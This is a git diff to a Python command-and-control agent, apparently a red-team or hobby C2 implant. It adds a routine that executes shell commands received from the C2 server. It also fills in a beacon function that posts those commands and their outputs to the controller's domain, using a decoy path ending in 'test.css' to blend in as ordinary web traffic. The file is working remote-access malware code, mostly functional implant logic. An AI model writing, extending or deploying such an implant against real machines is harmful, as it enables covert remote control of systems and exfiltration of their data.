@@ -1,5 +1,6 @@
 # NOTE: This is a newer agent file to handle more advanced beacon and session communication
 # At some point the agent_html.py will be reintegrated in some form here
+from sys import stderr
 import time
 import random
 from flask import request
@@ -64,20 +65,52 @@ class Agent:
 
         # The agent checks in to see if commands are available
         commands = self._check_in()
-        results = []
         if commands:
-            results = self._execute_command(commands)
-            return self._beacon_back(results)
+            results = self._execute_commands(commands)
+            print(f"THESE ARE THE RESULTS {results}")
+            return self._beacon_back(commands, results)
         else:
             # Means that no commands were recieved (or there was a connection erorr and we sleep)
             return False
 
-    def _beacon_back(self, results) -> bool:
+    def _beacon_back(self, commands, results) -> bool:
         """Beacons back the output of any commands to the C2 server
+        Args:
+            commands: List of original commands that were executed
+            results: List of command results/outputs
         Returns:
             True - Results were successfully sent back
             False - Results were not sucessfully sent back"""
-        pass
+
+        self.session = requests.Session()
+
+        try:
+            # TODO: This should also have the nonce and have some randomly generated names for the files
+            payload = {"commands": commands, "results": results}
+
+            request = self.session.post(
+                f"http://{self.activeDomain}/fjioawejfoew/jfioewajfo/test.css",
+                json=payload
+            )
+
+            # Check for any failed connections or attempts
+            request.raise_for_status()
+
+            return True
+
+        except requests.exceptions.Timeout:
+            print("Request timed out")
+        except requests.exceptions.ConnectionError:
+            print("Connection error occurred")
+        except requests.exceptions.HTTPError as e:
+            print(f"HTTP error: {e}")
+            # Here might be where the watchdog_timer and itnerval timer setting is set up
+        except requests.exceptions.RequestException as e:
+            print(f"Request failed: {e}")
+        except Exception as e:
+            print(f"Unexpecd error: {e}")
+
+        return False
 
     def _check_in(self) -> List[str] | None:
         """Obtains any available commands if there are any, if no commands are available it fails"""
@@ -112,11 +145,22 @@ class Agent:
 
         return None
 
+    def _execute_commands(self, commands_list):
+        """
+        Takes a list of commands, and strips them appropriately so that they can be passed to be executed
+        """
+        results = []
+
+        for command in commands_list:
+            command_as_list = command.split()
+            print(command_as_list)
+            results.append(self._execute_command(command_list=command_as_list))
+        return results
+
     def _execute_command(self, command_list):
         """
         Executes commands (passed in as a parameter of a list) in order to run
         """
-        result = None
         try:
             """
             Returns a CompletedProcess object with the following attributes: 
@@ -135,8 +179,10 @@ class Agent:
             return result.stdout
         except subprocess.CalledProcessError as e:
             print(f"Command failed {e.stderr}")
+            return e.stderr
         except Exception as e:
             print(f"Error: {e}")
+            return str(e)
 
     def get_beacon_range(self, range: int = 10):
         """Returns a range for the beacon as a tuple this is so it runs on a slight jitter
